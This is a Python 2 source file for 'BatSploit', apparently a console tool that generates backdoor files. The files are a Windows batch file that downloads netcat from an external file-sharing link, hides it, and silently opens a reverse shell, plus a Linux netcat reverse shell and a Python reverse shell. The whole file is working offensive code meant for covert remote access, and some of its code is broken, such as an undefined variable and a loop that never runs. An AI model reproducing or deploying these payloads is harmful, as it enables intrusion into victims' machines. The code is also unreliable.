#Author : Daniel Victor Freire Feitosa
#Version : 1.1.0
import os

def banner():
	os.system("cls") # if windows
	#os.system("ls") # if linux
	print ""
	print " /$$$$$$$              /$$      /$$$$$$            /$$           /$$   /$$"    
	print " | $$__  $$            | $$     /$$__  $$          | $$          |__/  | $$"  
	print " | $$  \ $$  /$$$$$$  /$$$$$$  | $$  \__/  /$$$$$$ | $$  /$$$$$$  /$$ /$$$$$$"  
	print " | $$$$$$$  |____  $$|_  $$_/  |  $$$$$$  /$$__  $$| $$ /$$__  $$| $$|_  $$_/"  
	print " | $$__  $$  /$$$$$$$  | $$     \____  $$| $$  \ $$| $$| $$  \ $$| $$  | $$  "  
	print " | $$  \ $$ /$$__  $$  | $$ /$$ /$$  \ $$| $$  | $$| $$| $$  | $$| $$  | $$ /$$"
	print " | $$$$$$$/|  $$$$$$$  |  $$$$/|  $$$$$$/| $$$$$$$/| $$|  $$$$$$/| $$  |  $$$$/"
	print " |_______/  \_______/   \___/   \______/ | $$____/ |__/ \______/ |__/   \___/  "
	print "                                         | $$                                "  
	print "                                         | $$                                "  
	print "                                         |__/          "
	print ""
	print "	CODER : Daniel Victor Freire Feitosa | @DanielFreire00 | ProXySec	"
	print ""
	print "Payloads List\r\n"
	print "==============================================================================="
	print "[1] NetCat Windows Reverse Shell : 	windows/bd_netcat/reverse_shell\r\n"
	print "[2] NetCat Linux Reverse Shell 	: 	linux/bd_netcat/reverse_shell\r\n"
	print "[3] Python Reverse Shell 	: 	python/reverse_shell\r\n"
	print ""
	print "Exemplo : payload windows/bd_netcat/reverse_shell"
	print ""

def backdoor_netcat_windows(nc, host, port, name):
	bd = "color 7f && mode 20, 10\r\n"
	bd += "cd %TEMP%\r\n"
	bd += "echo powershell(new-object system.net.webclient).downloadfile('"+nc+"', 'nc.exe') >> bd.bat\r\n"
	bd += "echo attrib +s +h nc.exe >> bd.bat\r\n"
	bd += "echo nc " + host + " " + port + " -e cmd >> bd.bat\r\n"
	bd += "attrib +s +h bd.bat\r\n"
	bd += "powershell -W hidden ./bd.bat"
	arquivo = open(name + ".bat", "w")
	arquivo.write(bd)

def backdoor_netcat_linux(host, port, name):
	bd = "echo nc "+host+" "+port+" -e /bin/bash > bd.sh"
	bd += "sh bd.sh & dismown && clear &> dev/null"
	bd += "clear"
	arquivo = open(name + ".sh", "w")
	arquivo.write(bd)

def backdoor_python(host, port, name):
	bd  = "import socket, os\r"
	bd += "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\r"
	bd += "s.connect(('"+host+"', "+port+"))\r"
	bd += "QD=True\r"
	bd += "while not QD:\r"
	bd += "	data = s.recv(1024)\r"
	bd += "	if len(data)==0:\r"
	bd += "		QD=True\r"
	bd += "	a,b,c,=os.popen3(data)\r"
	bd += "	b_value=b.read()+c.read()\r"
	bd += "	s.send(b_value)"
	arquivo = open(name + ".py", "w")
	arquivo.write(bd)


def run():
	banner()
	cmd = raw_input("BatSploit Console _> ")
	if cmd == "payload windows/bd_netcat/reverse_shell":
		print ""
		print "[+] NetCat Windows Reverse Shell"
		print ""
		nc_link = raw_input("NetCat Link Download _> ")
		if nc_link == "default":
			nc = "https://fs08n4.sendspace.com/dl/da6d40ac2f983344f01ccb0019856dc5/5974190e24783ff5/3ajt22/nc.exe"
			#nc = "http://localhost/nc.exe"
		else:
			nc = nc_link
		host = raw_input("LHOST _> ")
		port = raw_input("LPORT _> ")
		name = raw_input("Name of backdoor _> ")
		try:
			print ""
			print "[-] Criando Backdoor"
			backdoor_netcat_windows(nc, host, port, name)
			print "[+] Backdoor Criada : " + name + ".bat"
		except:
			print "[x] Algo deu errado..."
	elif cmd == "payload linux/bd_netcat/reverse_shell":
		print ""
		print "[+] NetCat Linux Reverse Shell"
		print ""
		host = raw_input("LHOST _> ")
		port = raw_input("LPORT _> ")
		name = raw_input("Name of backdoor _> ")
		try:
			print ""
			print "[-] Criando Backdoor"
			backdoor_netcat_linux(nc, host, port, name)
			print "[+] Backdoor Criada : " + name + ".sh"

		except:
			print "[x] Algo deu errado..."
	elif cmd == "payload python/reverse_shell":
		print ""
		print "[+] Python Reverse Shell"
		print ""
		host = raw_input("LHOST _> ")
		port = raw_input("LPORT _> ")
		name = raw_input("Name of backdoor _> ")
		try:
			print ""
			print "[-] Criando Backdoor"
			backdoor_python(host, port, name)
			print "[+] Backdoor Criada : " + name + ".py"
		except:
			print "[x] Algo deu errado..."

run()
